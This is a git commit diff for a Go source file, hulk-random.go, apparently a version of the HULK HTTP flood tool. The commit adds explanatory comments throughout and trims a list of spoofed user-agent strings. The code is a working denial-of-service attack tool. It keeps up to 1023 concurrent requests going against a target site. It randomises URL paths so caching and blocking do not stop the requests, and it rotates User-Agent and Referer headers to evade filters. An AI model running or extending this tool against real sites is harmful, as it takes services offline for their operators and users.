3a597e6b3dde8fec484144eac74a7fb0f811e748
clairelim-cf <92368131+clairelim-cf@users.noreply.github.com>
2025-03-18 20:49:06 +1100

    Update hulk-random.go

--- hulk-random.go
+++ hulk-random.go
@@ -1,30 +1,36 @@
 package main
 
 import (
-    "flag"
-    "fmt"
-    "math/rand"
-    "net/http"
-    "net/url"
-    "os"
-    "os/signal"
-    "strings"
-    "sync/atomic"
-    "syscall"
+    "flag"        // Handles command-line flags
+    "fmt"         // Handles formatted I/O
+    "math/rand"  // Generates random numbers
+    "net/http"   // Handles HTTP requests
+    "net/url"    // Parses URLs
+    "os"         // Handles OS-level functions
+    "os/signal"  // Handles OS signals
+    "strings"    // Provides string manipulation functions
+    "sync/atomic" // Provides atomic operations for concurrency
+    "syscall"    // Handles system calls
 )
 
+// Custom type for handling multiple header flags
 type arrayFlags []string
 
+// String representation of arrayFlags
 func (i *arrayFlags) String() string {
     return "[" + strings.Join(*i, ",") + "]"
 }
 
+// Appends new value to arrayFlags
 func (i *arrayFlags) Set(value string) error {
     *i = append(*i, value)
     return nil
 }
 
+// Version constant
 const __version__ = "1.0.1"
+
+// Enum-like constants to define various outcomes of HTTP requests
 const (
     callGotOk uint8 = iota
     callExitOnErr
@@ -33,8 +39,11 @@ const (
     targetComplete
 )
 
+// Global variables
 var (
-    safe bool
+    safe bool // Flag to indicate if the attack should auto-shutdown
+    
+    // List of referer headers for randomisation
     headersReferers = []string{
         "http://www.google.com/?q=",
         "http://www.usatoday.com/search/results?q=",
@@ -42,52 +51,55 @@ var (
         "http://www.bing.com/search?q=",
         "http://search.yahoo.com/search?p=",
     }
+    
+    // List of user-agent headers for randomisation
     headersUseragents = []string{
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:122.0) Gecko/20100101 Firefox/122.0",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/122.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/537.36",
-        "Mozilla/5.0 (Android 14; Mobile; rv:122.0) Gecko/122.0 Firefox/122.0",
     }
-    cur int32
+    
+    cur int32 // Counter for the number of concurrent requests
 )
 
 func main() {
     var (
-        version bool
-        site string
-        headers arrayFlags
+        version bool    // Flag for printing the version
+        site string     // Target site URL
+        headers arrayFlags // Custom headers to be added to requests
     )
 
+    // Defining command-line flags
     flag.BoolVar(&version, "version", false, "print version and exit")
-    flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
-    flag.StringVar(&site, "site", "http://localhost", "Destination site.")
-    flag.Var(&headers, "header", "Add headers to the request.")
+    flag.BoolVar(&safe, "safe", false, "Autoshut after DoS attack")
+    flag.StringVar(&site, "site", "http://localhost", "Destination site")
+    flag.Var(&headers, "header", "Add headers to the request")
     flag.Parse()
 
+    // Parsing the provided site URL
     u, err := url.Parse(site)
     if err != nil {
         fmt.Println("Error parsing URL parameter")
         os.Exit(1)
     }
 
+    // If version flag is set, print version and exit
     if version {
         fmt.Println("Hulk", __version__)
         os.Exit(0)
     }
 
+    // Start the attack in a separate goroutine
     go func() {
         fmt.Println("-- HULK Attack Started --\n        Go!\n")
-        ss := make(chan uint8, 8)
+        ss := make(chan uint8, 8) // Channel for communication between goroutines
         var errCount, sent, blocked int32
 
         fmt.Println("In use      |  Resp OK |  Got err  |  Blocked")
         for {
             if atomic.LoadInt32(&cur) < 1023 {
-                go httpcall(site, u.Host, headers, ss)
+                go httpcall(site, u.Host, headers, ss) // Start a new HTTP request
             }
             if sent%10 == 0 {
                 fmt.Printf("\r%6d of max 1023 | %7d | %7d | %7d", cur, sent, errCount, blocked)
@@ -111,15 +123,19 @@ func main() {
         }
     }()
 
+    // Handle termination signals (Ctrl+C, kill, etc.)
     ctlc := make(chan os.Signal)
     signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
     <-ctlc
     fmt.Println("\r\n-- Interrupted by user --\n")
 }
 
+// Function to make an HTTP request to the target site
 func httpcall(url string, host string, headers arrayFlags, s chan uint8) {
     atomic.AddInt32(&cur, 1)
     client := &http.Client{}
+    
+    // Generate a random path to avoid caching/blocking
     randomPath := generateRandomPath(5)
     fullURL := url + "/" + randomPath
 
@@ -129,6 +145,7 @@ func httpcall(url string, host string, headers arrayFlags, s chan uint8) {
         return
     }
 
+    // Set random User-Agent and Referer headers
     req.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
     req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))])
 
@@ -146,6 +163,7 @@ func httpcall(url string, host string, headers arrayFlags, s chan uint8) {
     s <- callGotOk
 }
 
+// Function to generate a random string of given length
 func generateRandomPath(length int) string {
     letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
     s := make([]rune, length)
